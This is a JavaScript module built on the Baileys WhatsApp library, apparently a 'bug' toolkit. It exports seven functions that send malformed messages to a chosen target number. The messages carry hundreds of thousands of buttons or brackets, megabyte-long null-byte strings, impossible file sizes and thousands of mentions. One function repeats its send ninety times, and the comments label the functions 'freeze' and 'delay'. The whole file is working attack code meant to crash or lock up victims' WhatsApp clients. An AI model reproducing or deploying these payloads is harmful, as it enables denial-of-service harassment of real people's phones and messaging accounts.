const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, generateMessageTag, generateMessageID, Header 
} = require("@whiskeysockets/baileys");

const crypto = require('crypto')
let prim;

// freeze

async function invisSqL2(prim, target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
              fileLength: "93217",
              caption: "Bug ?",
              height: 1080,
              width: 1080,
              mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
              fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
              directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1778142659",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: false
              },
              scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
            },
            title: "Bug ?",
            hasMediaAttachment: true
          },
          body: {
            text: "\0"
          },
          nativeFlowMessage: {
            buttons: "[".repeat(500000)
          }
        }
      }
    }
  };
  
  await prim.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  })
}

async function docThumb(prim, target, gs = false, array = true) {
  const docs = {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
      fileLength: "72028",
      pageCount: 1,
      mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
      fileName: "Bug ?",
      fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
      directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1779839963",
      thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
    thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
    thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
    jpegThumbnail: "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",
      contextInfo: {},
      thumbnailHeight: 480,
      thumbnailWidth: 480
    }
  };
  
  const msg = {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true,
        documentMessage: docs.documentMessage
      },
      body: {
        text: "Bug ?"
      },
      nativeFlowMessage: {
        buttons: array ? Array.from({ length: 500000 }, () => ({})) : "[".repeat(500000)
      }
    }
  }
  
  await prim.relayMessage(target, gs ? {
    groupStatusMessageV2: {
      message: msg
    }
  } : msg, {
    participant: true
  })
}

async function ofmCrashSql(prim, target) {
  let cards = [];
 
  for (let p = 0; p < 25; p++) {
    cards.push({ 
      header: {
        title: 'Bug ?',
        videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
      fileLength: "1099511627776",
      seconds: 172800,
      mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
      height: 1080,
      width: 1920,
      fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
      directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1774428565",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEECBhQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
    },
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(9999), 
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: `{"title":"${"\u0000".repeat(9000)}","rows":[]}`
          }
        ]
      }
    });
  }

  const PouMsg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32), 
          supportPayload: "{}"
        },
        interactiveMessage: {
          body: {
            text: "Bug ?"
          }, 
          carouselMessage: {
            cards: cards
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, p) => `${p + 62}@s.whatsapp.net`),
           quotedMessage: {
             paymentInviteMessage: {
             serviceType: 3,
              expiryTimestamp: 7205
              }
            },
           remoteJid: "status@broadcast"
           }
        }
      }
    }
  }, {});

  await prim.relayMessage(target, PouMsg.message, {
    messageId: PouMsg.key.id,
    participant: true
  }
);

const bokepPou = await prepareWAMessageMedia(
{ image: { url: "https://files.catbox.moe/zqqcsp.mp4" } },
{ upload: prim.waUploadToServer }
);

   const muaniPou = {
      buttons: [
         {
            name: "galaxy_message",
            buttonParamsJson: `{\"flow_cta\":\"${"\u0000".repeat(200000)}\"}`,
            version: 3
         }
      ]
   };
   const PouCrousel = () => ({
      header: {
         ...bokepPou,
         hasMediaAttachment: true
      },
      nativeFlowMessage: {
            ...muaniPou,
      }
   });
   let PouMsg2 = await generateWAMessageFromContent(target,
      proto.Message.fromObject({
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: { text: "Bug ?" },
                  carouselMessage: {
                     cards: [
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel()
                     ]
                  },
                  contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, p) => `${p + 62}@s.whatsapp.net`), }
               }
            }
         }
      }),
    {}
   );
   await prim.relayMessage(target, PouMsg2.message, {
      messageId: null,
      participant: true
   });
}

async function freeze(prim, target) {
    const poutamvan = {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQP6sL1vC_ovj_qwy7t6Zt7Mtb2r-fBeOAH-lIbrp19MixownR-gp6gmnX0thyETaDpCl0OXlxKbGbzlqwUjK1gStOsdDc6aNeeb2blxnw?ccb=9-4&oh=01_Q5Aa5AHliaFEaeSA4rXhPnn1Q5-z4JB19O97Y_T92yd-1fYdlA&oe=6A97BE34&_nc_sid=e6ed6c&mms3=true",
        "mimetype": "image/jpeg",
        "fileSha256": "K+hf3JtLOZcX2/ZlOojBYiImodOLBNK219jwEyfnIu8=",
        "fileLength": "21197",
        "height": 764,
        "width": 735,
        "mediaKey": "ppS2Qk08v7XU94/taa9fbrQF/Mf0kzE+FuAwrqPgfdY=",
        "fileEncSha256": "hM+qBfOfHgvywq+x2Nct2FawX2sf/bjvZJ/rxS0b6Ic=",
        "directPath": "/o1/v/t24/f2/m235/AQP6sL1vC_ovj_qwy7t6Zt7Mtb2r-fBeOAH-lIbrp19MixownR-gp6gmnX0thyETaDpCl0OXlxKbGbzlqwUjK1gStOsdDc6aNeeb2blxnw?ccb=9-4&oh=01_Q5Aa5AHliaFEaeSA4rXhPnn1Q5-z4JB19O97Y_T92yd-1fYdlA&oe=6A97BE34&_nc_sid=e6ed6c",
        "mediaKeyTimestamp": "1785749485",
        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgARQMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAQQFBgIBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA5kE3aIuxTAAAE7mf2xg4/ZZZyiYAAL3UcZ0M1p505aZsFgACxXGln+QAAAAAAB//xAAkEAACAgIBBAEFAAAAAAAAAAABAgADBBExBRMgIhASMDJAcf/aAAgBAQABPwD4HI3O9Q35JO7Rxo6lltBr0qnf3wNnUxuks6B3jdMrA4mViNR/PLAQWZVYMLBdDYlzBRMtBZQ8Pj046y652Vstsdt7UjUzFLgCfSKsWw7h58a3Nbqw5BleXYxays+pHtLstiuww3L7WWoqW2zedGS9BOuDyJZmoy+tYDRmLHZ/W//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABcRAAMBAAAAAAAAAAAAAAAAAAAwQQH/2gAIAQMBAT8AXlI3/9k=",
        "contextInfo": {
            "pairedMediaType": "NOT_PAIRED_MEDIA",
            "statusSourceType": "IMAGE",
            "mediaDomainInfo": {
                "mediaKeyDomain": "MEDIA_KEY_DOMAIN_NON_E2EE",
                "e2EeMediaKey": "0nlMnjboIhHYAQHS0VgPy1aw24LPn7siLetdTnDzoCA="
            }
        },
        "scansSidecar": "yjtqbZQI3qUGIXYGGKStmcfdGDl8xahdlgE84bL5Wlmxz5hl1C2yVg==",
        "scanLengths": [
            3332,
            9117,
            3936,
            4812
        ],
        "midQualityFileSha256": "OkXXOgfFqdIJfyrcgVqrR0rhacnVvsSukbSgF65rsd4="
    }
    
    let pou = []
    for (let p = 0; p < 9; p++) {
        pou.push({
            header: {
                hasMediaAttachment: true,
                productMessage: {
                    product: {
                        productImage: poutamvan,
                        productId: "35767262379539399",
                        title: "Bug ?",
                        description: "Bug ?",
                        currencyCode: "IDR",
                        priceAmount1000: "999999999999000",
                        salePriceAmount1000: "900000000000000",
                        productImageCount: 1
                    },
                    businessOwnerJid: "0@s.whatsapp.net"
                }
            },
            body: {
                text: teks
            },
            footer: {
                text: "Bug ?"
            },
            nativeFlowMessage: {
                buttons: "\0".repeat(50000),
                messageParamsJson: `{\"tap_target_configuration\":{\"title\":\"// Bug ? ()\",\"canonical_url\":\"https://t.me/${"\0".repeat(8000)}\"}}`
            },
        })
    }

    let quotedMessage = {
        key: {
            participant: "13135550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            fromMe: false
        },
        message: {
            groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "Bug ?" },
                    carouselMessage: {
                        cards: pou
                    },
                    contextInfo: { 
                        mentionedJid: Array.from({ length: 2000 }, (_, p) => `${p + 62}@s.whatsapp.net`)
                    }
                }
            }
          }
        }
    };

    for (let p = 0; p < 90; p++) {
        await prim.relayMessage(target, {
            interactiveResponseMessage: {
                body: {
                    text: "\0",
                    format: 0
                },
                nativeFlowResponseMessage: {
                    paramsJson: "{}"
                },
                contextInfo: {
                quotedMessage: quotedMessage.message
                }
            }
        }, {participant: true})
    }
}

async function frezcrashXcx(prim, target) {
const attam = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "Bug ?"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
albumMessage: {
expectedImageCount: 9999,
expectedVideoCount: 9999
},
},
},
},
},
},
};

const trava = generateWAMessageFromContent(target, attam, {});

await prim.relayMessage(target, trava.message, {
messageId: trava.key.id
})
}

// delay

async function ofmcrsl(prim, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
        fileLength: 162903,
        height: 1080,
        width: 1080,
        mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
        fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
        directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
        mediaKeyTimestamp: 1775033718,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA"
        },
        scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
        scanLengths: [
            9999999999999999999,
            9999999999999999999,
            9999999999999999999,
            9999999999999999999
        ],
        midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
    };

    let cards = [];
        cards.push({
            header: {
                imageMessage,
                hasMediaAttachment: true
            },

            nativeFlowMessage: {
                buttons: [
                    {
                        name: "galaxy_message",
                        paramsJson:
                            JSON.stringify({
                                wa_flow_response_params: {
                                    title: "\x10".repeat(60000)
                                }
                            }
                        )
                    }
                ]
            }
        });

    let msg = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\0"
                    },

                    carouselMessage: {
                        cards
                    }
                }
            }
        }
    }, {});

    await prim.relayMessage(target, msg.message, {
        participant: true
    });
}

async function vcs(prim, target) {
  await prim.relayMessage(target, {
    interactiveMessage: {
      body: { text: "Bug ?" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select"
          },
          {
            name: "voice_call",
            buttonParamsJson: "\0".repeat(1000000)
          }
        ]
      }
    }
  }, {
    participant: true
  })
}

	
module.exports = { vcs, invisSqL2, ofmCrashSql, freeze, docThumb, ofmcrsl, frezcrashXcx }
